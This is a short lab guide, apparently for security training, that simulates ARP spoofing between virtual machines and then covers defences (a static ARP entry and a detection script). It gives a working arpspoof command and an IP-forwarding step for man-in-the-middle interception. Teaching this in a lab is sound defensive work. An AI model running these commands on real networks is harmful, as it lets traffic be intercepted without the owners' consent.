# 🔬 Lab 1: ARP Spoofing Simulation

This lab demonstrates how ARP Spoofing works and how to defend against it.

---

## ⚙️ Requirements
- 2 or 3 Virtual Machines:
  - Attacker: Kali Linux / Parrot OS
  - Victim: Ubuntu / Windows
  - Gateway: Router VM or real home router
- Same network (VirtualBox "Internal Network" / VMware "Host-Only" / GNS3)

---

## 🔹 Step 1: Identify IPs and MACs
On each VM:
    $bash
    ifconfig       # check IP address
    arp -a         # check ARP table


Example:

Victim: 192.168.1.10 → MAC 66:77:88:99:AA:BB

Gateway: 192.168.1.1 → MAC 00:11:22:33:44:55

---

## 🔹 Step 2: Launch ARP Spoof Attack

On attacker (Kali/Parrot):
    $bash
    sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1

This poisons the ARP table of the victim.

If you want to relay traffic so the victim still has internet:
    $bash
    echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

---

## 🔹 Step 3: Verify the Attack
On victim:
    $bash
    arp -a

➡️ You will see the gateway IP now pointing to the attacker's MAC.

Try pinging or browsing — traffic is intercepted.

---

## 🔹 Step 4: Defense / Mitigation
1. Static ARP entry on victim:
    $bash
    sudo arp -s 192.168.1.1 00:11:22:33:44:55

2. Run detection script (from scripts/arp_defense.py):
    python3 arp_defense.py

You should see alerts if spoofing occurs.


✅ Lab Summary
- Learned how ARP Spoofing poisons ARP tables.
- Simulated the attack with arpspoof.
- Defended using static ARP + detection script.